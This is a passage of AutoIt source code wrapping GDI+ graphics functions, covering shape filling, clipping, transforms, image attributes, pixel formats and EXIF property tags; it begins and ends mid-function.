	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFillPie", "handle", $hgraphics, "handle", $hbrush, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillpolygon($hgraphics, $apoints, $hbrush = 0)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	__gdiplus_brushdefcreate($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFillPolygon", "handle", $hgraphics, "handle", $hbrush, "struct*", $tpoints, "int", $icount, "int", "FillModeAlternate")
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillrect($hgraphics, $nx, $ny, $nwidth, $nheight, $hbrush = 0)
	__gdiplus_brushdefcreate($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFillRectangle", "handle", $hgraphics, "handle", $hbrush, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsfillregion($hgraphics, $hregion, $hbrush = 0)
	__gdiplus_brushdefcreate($hbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFillRegion", "handle", $hgraphics, "handle", $hbrush, "handle", $hregion)
	__gdiplus_brushdefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsgetcompositingmode($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetCompositingMode", "handle", $hgraphics, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicsgetcompositingquality($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetCompositingQuality", "handle", $hgraphics, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicsgetdc($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetDC", "handle", $hgraphics, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicsgetinterpolationmode($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetInterpolationMode", "handle", $hgraphics, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicsgetsmoothingmode($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetSmoothingMode", "handle", $hgraphics, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Switch $aresult[2]
		Case $gdip_smoothingmode_none
			Return 0
		Case $gdip_smoothingmode_highquality, $gdip_smoothingmode_antialias8x4
			Return 1
		Case $gdip_smoothingmode_antialias8x8
			Return 2
		Case Else
			Return 0
	EndSwitch
EndFunc

Func _gdiplus_graphicsgettransform($hgraphics, $hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetWorldTransform", "handle", $hgraphics, "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsmeasurecharacterranges($hgraphics, $sstring, $hfont, $tlayout, $hstringformat)
	Local $icount = _gdiplus_stringformatgetmeasurablecharacterrangecount($hstringformat)
	If @error Then Return SetError(@error, @extended, 0)
	Local $tregions = DllStructCreate("handle[" & $icount & "]")
	Local $aregions[$icount + 1] = [$icount]
	For $ii = 1 To $icount
		$aregions[$ii] = _gdiplus_regioncreate()
		DllStructSetData($tregions, 1, $aregions[$ii], $ii)
	Next
	DllCall($__g_hgdipdll, "int", "GdipMeasureCharacterRanges", "handle", $hgraphics, "wstr", $sstring, "int", -1, "hwnd", $hfont, "struct*", $tlayout, "handle", $hstringformat, "int", $icount, "struct*", $tregions)
	Local $ierror = @error, $iextended = @extended
	If $ierror Then
		For $ii = 1 To $icount
			_gdiplus_regiondispose($aregions[$ii])
		Next
		Return SetError($ierror + 10, $iextended, 0)
	EndIf
	Return $aregions
EndFunc

Func _gdiplus_graphicsmeasurestring($hgraphics, $sstring, $hfont, $tlayout, $hformat)
	Local $trectf = DllStructCreate($taggdiprectf)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipMeasureString", "handle", $hgraphics, "wstr", $sstring, "int", -1, "handle", $hfont, "struct*", $tlayout, "handle", $hformat, "struct*", $trectf, "int*", 0, "int*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Local $ainfo[3]
	$ainfo[0] = $trectf
	$ainfo[1] = $aresult[8]
	$ainfo[2] = $aresult[9]
	Return $ainfo
EndFunc

Func _gdiplus_graphicsreleasedc($hgraphics, $hdc)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipReleaseDC", "handle", $hgraphics, "handle", $hdc)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicsresetclip($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipResetClip", "handle", $hgraphics)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsresettransform($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipResetWorldTransform", "handle", $hgraphics)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsrestore($hgraphics, $istate)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipRestoreGraphics", "handle", $hgraphics, "uint", $istate)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicsrotatetransform($hgraphics, $fangle, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipRotateWorldTransform", "handle", $hgraphics, "float", $fangle, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssave($hgraphics)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSaveGraphics", "handle", $hgraphics, "uint*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_graphicsscaletransform($hgraphics, $fscalex, $fscaley, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipScaleWorldTransform", "handle", $hgraphics, "float", $fscalex, "float", $fscaley, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetclippath($hgraphics, $hpath, $icombinemode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetClipPath", "handle", $hgraphics, "handle", $hpath, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetcliprect($hgraphics, $nx, $ny, $nwidth, $nheight, $icombinemode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetClipRect", "handle", $hgraphics, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetclipregion($hgraphics, $hregion, $icombinemode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetClipRegion", "handle", $hgraphics, "handle", $hregion, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetcompositingmode($hgraphics, $icompositionmode)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetCompositingMode", "handle", $hgraphics, "int", $icompositionmode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetcompositingquality($hgraphics, $icompositionquality)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetCompositingQuality", "handle", $hgraphics, "int", $icompositionquality)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetinterpolationmode($hgraphics, $iinterpolationmode)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetInterpolationMode", "handle", $hgraphics, "int", $iinterpolationmode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetpixeloffsetmode($hgraphics, $ipixeloffsetmode)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPixelOffsetMode", "handle", $hgraphics, "int", $ipixeloffsetmode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssetsmoothingmode($hgraphics, $ismooth)
	If $ismooth < $gdip_smoothingmode_default OR $ismooth > $gdip_smoothingmode_antialias8x8 Then $ismooth = $gdip_smoothingmode_default
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetSmoothingMode", "handle", $hgraphics, "int", $ismooth)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssettextrenderinghint($hgraphics, $itextrenderinghint)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetTextRenderingHint", "handle", $hgraphics, "int", $itextrenderinghint)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicssettransform($hgraphics, $hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetWorldTransform", "handle", $hgraphics, "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_graphicstransformpoints($hgraphics, ByRef $apoints, $icoordspaceto = 0, $icoordspacefrom = 1)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], ($ii - 1) * 2 + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], ($ii - 1) * 2 + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipTransformPoints", "handle", $hgraphics, "int", $icoordspaceto, "int", $icoordspacefrom, "struct*", $tpoints, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	For $ii = 1 To $icount
		$apoints[$ii][0] = DllStructGetData($tpoints, 1, ($ii - 1) * 2 + 1)
		$apoints[$ii][1] = DllStructGetData($tpoints, 1, ($ii - 1) * 2 + 2)
	Next
	Return True
EndFunc

Func _gdiplus_graphicstranslatetransform($hgraphics, $ndx, $ndy, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipTranslateWorldTransform", "handle", $hgraphics, "float", $ndx, "float", $ndy, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_hatchbrushcreate($ihatchstyle = 0, $iargbforeground = -1, $iargbbackground = -1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateHatchBrush", "int", $ihatchstyle, "uint", $iargbforeground, "uint", $iargbbackground, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[4]
EndFunc

Func _gdiplus_hiconcreatefrombitmap($hbitmap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateHICONFromBitmap", "handle", $hbitmap, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_imageattributescreate()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateImageAttributes", "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[1]
EndFunc

Func _gdiplus_imageattributesdispose($himageattributes)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDisposeImageAttributes", "handle", $himageattributes)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imageattributessetcolorkeys($himageattributes, $icoloradjusttype = 0, $benable = False, $iargblow = 0, $iargbhigh = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetImageAttributesColorKeys", "handle", $himageattributes, "int", $icoloradjusttype, "int", $benable, "uint", $iargblow, "uint", $iargbhigh)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imageattributessetcolormatrix($himageattributes, $icoloradjusttype = 0, $benable = False, $tclrmatrix = 0, $tgraymatrix = 0, $icolormatrixflags = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetImageAttributesColorMatrix", "handle", $himageattributes, "int", $icoloradjusttype, "int", $benable, "struct*", $tclrmatrix, "struct*", $tgraymatrix, "int", $icolormatrixflags)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imageattributessetremaptable($himageattributes, $acolormap = 0, $icoloradjusttype = 0, $benable = True)
	Local $aresult
	If IsArray($acolormap) Then
		Local $icount = $acolormap[0][0]
		Local $tcolormap = DllStructCreate("uint[" & $icount * 2 & "]")
		For $i = 1 To $icount
			DllStructSetData($tcolormap, 1, $acolormap[$i][0], ($i - 1) * 2 + 1)
			DllStructSetData($tcolormap, 1, $acolormap[$i][1], ($i - 1) * 2 + 2)
		Next
		$aresult = DllCall($__g_hgdipdll, "int", "GdipSetImageAttributesRemapTable", "handle", $himageattributes, "int", $icoloradjusttype, "int", $benable, "int", $icount, "struct*", $tcolormap)
	Else
		$aresult = DllCall($__g_hgdipdll, "int", "GdipSetImageAttributesRemapTable", "handle", $himageattributes, "int", $icoloradjusttype, "int", $benable, "int", 0, "struct*", 0)
	EndIf
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imageattributessetthreshold($himageattributes, $fthreshold, $icoloradjusttype = $gdip_coloradjusttype_default, $benable = True)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetImageAttributesThreshold", "handle", $himageattributes, "int", $icoloradjusttype, "bool", $benable, "float", $fthreshold)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imageclone($himage)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCloneImage", "handle", $himage, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_imagedispose($himage)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDisposeImage", "handle", $himage)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imagegetdimension($himage)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageDimension", "handle", $himage, "float*", 0, "float*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Local $aimgdim[2] = [$aresult[2], $aresult[3]]
	Return $aimgdim
EndFunc

Func _gdiplus_imagegetflags($himage)
	Local $aflag[2] = [0, ""]
	If ($himage = -1) OR (NOT $himage) Then Return SetError(11, 0, $aflag)
	Local $aimageflags[13][2] = [["Pixel data Cacheable", $gdip_imageflags_caching], ["Pixel data read-only", $gdip_imageflags_readonly], ["Pixel size in image", $gdip_imageflags_hasrealpixelsize], ["DPI info in image", $gdip_imageflags_hasrealdpi], ["YCCK color space", $gdip_imageflags_colorspace_ycck], ["YCBCR color space", $gdip_imageflags_colorspace_ycbcr], ["Grayscale image", $gdip_imageflags_colorspace_gray], ["CMYK color space", $gdip_imageflags_colorspace_cmyk], ["RGB color space", $gdip_imageflags_colorspace_rgb], ["Partially scalable", $gdip_imageflags_partiallyscalable], ["Alpha values other than 0 (transparent) and 255 (opaque)", $gdip_imageflags_hastranslucent], ["Alpha values", $gdip_imageflags_hasalpha], ["Scalable", $gdip_imageflags_scalable]]
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageFlags", "handle", $himage, "long*", 0)
	If @error Then Return SetError(@error, @extended, $aflag)
	If $aresult[0] Then Return SetError(10, $aresult[0], $aflag)
	If $aresult[2] = $gdip_imageflags_none Then
		$aflag[1] = "No pixel data"
		Return SetError(12, $aresult[2], $aflag)
	EndIf
	$aflag[0] = $aresult[2]
	For $i = 0 To 12
		If BitAND($aresult[2], $aimageflags[$i][1]) = $aimageflags[$i][1] Then
			If StringLen($aflag[1]) Then $aflag[1] &= "|"
			$aresult[2] -= $aimageflags[$i][1]
			$aflag[1] &= $aimageflags[$i][0]
		EndIf
	Next
	Return $aflag
EndFunc

Func _gdiplus_imagegetframecount($himage, $sdimensionid)
	Local $tguid = _winapi_guidfromstring($sdimensionid)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipImageGetFrameCount", "handle", $himage, "struct*", $tguid, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[3]
EndFunc

Func _gdiplus_imagegetgraphicscontext($himage)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageGraphicsContext", "handle", $himage, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_imagegetheight($himage)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageHeight", "handle", $himage, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_imagegethorizontalresolution($himage)
	If ($himage = -1) OR (NOT $himage) Then Return SetError(11, 0, 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageHorizontalResolution", "handle", $himage, "float*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return Round($aresult[2])
EndFunc

Func _gdiplus_imagegetpixelformat($himage)
	Local $aformat[2] = [0, ""]
	If ($himage = -1) OR (NOT $himage) Then Return SetError(11, 0, $aformat)
	Local $apixelformat[14][2] = [["1 Bpp Indexed", $gdip_pxf01indexed], ["4 Bpp Indexed", $gdip_pxf04indexed], ["8 Bpp Indexed", $gdip_pxf08indexed], ["16 Bpp Grayscale", $gdip_pxf16grayscale], ["16 Bpp RGB 555", $gdip_pxf16rgb555], ["16 Bpp RGB 565", $gdip_pxf16rgb565], ["16 Bpp ARGB 1555", $gdip_pxf16argb1555], ["24 Bpp RGB", $gdip_pxf24rgb], ["32 Bpp RGB", $gdip_pxf32rgb], ["32 Bpp ARGB", $gdip_pxf32argb], ["32 Bpp PARGB", $gdip_pxf32pargb], ["48 Bpp RGB", $gdip_pxf48rgb], ["64 Bpp ARGB", $gdip_pxf64argb], ["64 Bpp PARGB", $gdip_pxf64pargb]]
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImagePixelFormat", "handle", $himage, "int*", 0)
	If @error Then Return SetError(@error, @extended, $aformat)
	If $aresult[0] Then Return SetError(10, $aresult[0], $aformat)
	For $i = 0 To 13
		If $apixelformat[$i][1] = $aresult[2] Then
			$aformat[0] = $apixelformat[$i][1]
			$aformat[1] = $apixelformat[$i][0]
			Return $aformat
		EndIf
	Next
	Return SetError(12, 0, $aformat)
EndFunc

Func __gdiplus_imagegetpropertycount($himage)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPropertyCount", "handle", $himage, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_imagegetpropertyidlist($himage)
	Local $icount = __gdiplus_imagegetpropertycount($himage)
	If @error Then Return SetError(@error, @extended, False)
	Local $tproperties = DllStructCreate("uint[" & $icount & "]")
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPropertyIdList", "handle", $himage, "int", $icount, "struct*", $tproperties)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Local $spropertytaginfo = "0x0000=GpsVer;0x0001=GpsLatitudeRef;0x0002=GpsLatitude;0x0003=GpsLongitudeRef;0x0004=GpsLongitude;0x0005=GpsAltitudeRef;0x0006=GpsAltitude;0x0007=GpsGpsTime;0x0008=GpsGpsSatellites;0x0009=GpsGpsStatus;0x000A=GpsGpsMeasureMode;0x000B=GpsGpsDop;0x000C=GpsSpeedRef;0x000D=GpsSpeed;0x000E=GpsTrackRef;0x000F=GpsTrack;0x0010=GpsImgDirRef;0x0011=GpsImgDir;0x0012=GpsMapDatum;0x0013=GpsDestLatRef;0x0014=GpsDestLat;0x0015=GpsDestLongRef;0x0016=GpsDestLong;0x0017=GpsDestBearRef;0x0018=GpsDestBear;0x0019=GpsDestDistRef;0x001A=GpsDestDist;0x00FE=NewSubfileType;0x00FF=SubfileType;0x0100=ImageWidth;0x0101=ImageHeight;0x0102=BitsPerSample;0x0103=Compression;0x0106=PhotometricInterp;0x0107=ThreshHolding;0x0108=CellWidth;0x0109=CellHeight;0x010A=FillOrder;0x010D=DocumentName;0x010E=ImageDescription;0x010F=EquipMake;0x0110=EquipModel;0x0111=StripOffsets;0x0112=Orientation;0x0115=SamplesPerPixel;0x0116=RowsPerStrip;0x0117=StripBytesCount;0x0118=MinSampleValue;0x0119=MaxSampleValue;0x011A=XResolution;0x011B=YResolution;0x011C=PlanarConfig;0x011D=PageName;0x011E=XPosition;0x011F=YPosition;0x0120=FreeOffset;0x0121=FreeByteCounts;0x0122=GrayResponseUnit;0x0123=GrayResponseCurve;0x0124=T4Option;0x0125=T6Option;0x0128=ResolutionUnit;0x0129=PageNumber;0x012D=TransferFunction;0x0131=SoftwareUsed;0x0132=DateTime;0x013B=Artist;0x013C=HostComputer;0x013D=Predictor;0x013E=WhitePoint;0x013F=PrimaryChromaticities;0x0140=ColorMap;0x0141=HalftoneHints;0x0142=TileWidth;0x0143=TileLength;0x0144=TileOffset;0x0145=TileByteCounts;0x014C=InkSet;0x014D=InkNames;0x014E=NumberOfInks;0x0150=DotRange;0x0151=TargetPrinter;0x0152=ExtraSamples;0x0153=SampleFormat;0x0154=SMinSampleValue;0x0155=SMaxSampleValue;0x0156=TransferRange;0x0200=JPEGProc;0x0201=JPEGInterFormat;0x0202=JPEGInterLength;0x0203=JPEGRestartInterval;0x0205=JPEGLosslessPredictors;0x0206=JPEGPointTransforms;0x0207=JPEGQTables;0x0208=JPEGDCTables;0x0209=JPEGACTables;0x0211=YCbCrCoefficients;0x0212=YCbCrSubsampling;0x0213=YCbCrPositioning;0x0214=REFBlackWhite;0x0301=Gamma;0x0302=ICCProfileDescriptor;0x0303=SRGBRenderingIntent;0x0320=ImageTitle;0x5001=ResolutionXUnit;0x5002=ResolutionYUnit;0x5003=ResolutionXLengthUnit;0x5004=ResolutionYLengthUnit;0x5005=PrintFlags;0x5006=PrintFlagsVersion;0x5007=PrintFlagsCrop;0x5008=PrintFlagsBleedWidth;0x5009=PrintFlagsBleedWidthScale;0x500A=HalftoneLPI;0x500B=HalftoneLPIUnit;0x500C=HalftoneDegree;" & "0x500D=HalftoneShape;0x500E=HalftoneMisc;0x500F=HalftoneScreen;0x5010=JPEGQuality;0x5011=GridSize;0x5012=ThumbnailFormat;0x5013=ThumbnailWidth;0x5014=ThumbnailHeight;0x5015=ThumbnailColorDepth;0x5016=ThumbnailPlanes;0x5017=ThumbnailRawBytes;0x5018=ThumbnailSize;0x5019=ThumbnailCompressedSize;0x501A=ColorTransferFunction;0x501B=ThumbnailData;0x5020=ThumbnailImageWidth;0x5021=ThumbnailImageHeight;0x5022=ThumbnailBitsPerSample;0x5023=ThumbnailCompression;0x5024=ThumbnailPhotometricInterp;0x5025=ThumbnailImageDescription;0x5026=ThumbnailEquipMake;0x5027=ThumbnailEquipModel;0x5028=ThumbnailStripOffsets;0x5029=ThumbnailOrientation;0x502A=ThumbnailSamplesPerPixel;0x502B=ThumbnailRowsPerStrip;0x502C=ThumbnailStripBytesCount;0x502D=ThumbnailResolutionX;0x502E=ThumbnailResolutionY;0x502F=ThumbnailPlanarConfig;0x5030=ThumbnailResolutionUnit;0x5031=ThumbnailTransferFunction;0x5032=ThumbnailSoftwareUsed;0x5033=ThumbnailDateTime;0x5034=ThumbnailArtist;0x5035=ThumbnailWhitePoint;0x5036=ThumbnailPrimaryChromaticities;0x5037=ThumbnailYCbCrCoefficients;0x5038=ThumbnailYCbCrSubsampling;0x5039=ThumbnailYCbCrPositioning;0x503A=ThumbnailRefBlackWhite;0x503B=ThumbnailCopyRight;0x5090=LuminanceTable;0x5091=ChrominanceTable;0x5100=FrameDelay;0x5101=LoopCount;0x5102=GlobalPalette;0x5103=IndexBackground;0x5104=IndexTransparent;0x5110=PixelUnit;0x5111=PixelPerUnitX;0x5112=PixelPerUnitY;0x5113=PaletteHistogram;0x8298=Copyright;0x829A=ExifExposureTime;0x829D=ExifFNumber;0x8769=ExifIFD;0x8773=ICCProfile;0x8822=ExifExposureProg;0x8824=ExifSpectralSense;0x8825=GpsIFD;0x8827=ExifISOSpeed;0x8828=ExifOECF;0x9000=ExifVer;0x9003=ExifDTOrig;0x9004=ExifDTDigitized;0x9101=ExifCompConfig;0x9102=ExifCompBPP;0x9201=ExifShutterSpeed;0x9202=ExifAperture;0x9203=ExifBrightness;0x9204=ExifExposureBias;0x9205=ExifMaxAperture;0x9206=ExifSubjectDist;0x9207=ExifMeteringMode;0x9208=ExifLightSource;0x9209=ExifFlash;0x920A=ExifFocalLength;0x927C=ExifMakerNote;0x9286=ExifUserComment;0x9290=ExifDTSubsec;0x9291=ExifDTOrigSS;0x9292=ExifDTDigSS;0xA000=ExifFPXVer;0xA001=ExifColorSpace;0xA002=ExifPixXDim;0xA003=ExifPixYDim;0xA004=ExifRelatedWav;0xA005=ExifInterop;0xA20B=ExifFlashEnergy;0xA20C=ExifSpatialFR;0xA20E=ExifFocalXRes;0xA20F=ExifFocalYRes;0xA210=ExifFocalResUnit;0xA214=ExifSubjectLoc;0xA215=ExifExposureIndex;0xA217=ExifSensingMethod;0xA300=ExifFileSource;0xA301=ExifSceneType;0xA302=ExifCfaPattern"
	Local $aproperties[$icount + 1][2] = [[$icount]]
	Local $aregexp
	For $i = 1 To $icount
		$aproperties[$i][0] = DllStructGetData($tproperties, 1, $i)
		$aregexp = StringRegExp($spropertytaginfo, "(?i)" & Hex(DllStructGetData($tproperties, 1, $i), 4) & "=(\w+)", 3)
		Switch IsArray($aregexp)
			Case True
				$aproperties[$i][1] = $aregexp[0]
			Case Else
				$aproperties[$i][1] = "PropertyTagUnKnown"
		EndSwitch
	Next
	Return $aproperties
EndFunc

Func __gdiplus_imagegetpropertyitemsize($himage, $ipropid)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPropertyItemSize", "handle", $himage, "uint", $ipropid, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[3]
EndFunc

Func _gdiplus_imagegetpropertyitem($himage, $ipropid)
	Local $isize = __gdiplus_imagegetpropertyitemsize($himage, $ipropid)
	If @error Then Return SetError(@error, @extended, False)
	Local $tbuffer = DllStructCreate("byte[" & $isize & "];")
	Local $pbuffer = DllStructGetPtr($tbuffer)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPropertyItem", "handle", $himage, "uint", $ipropid, "uint", $isize, "struct*", $tbuffer)
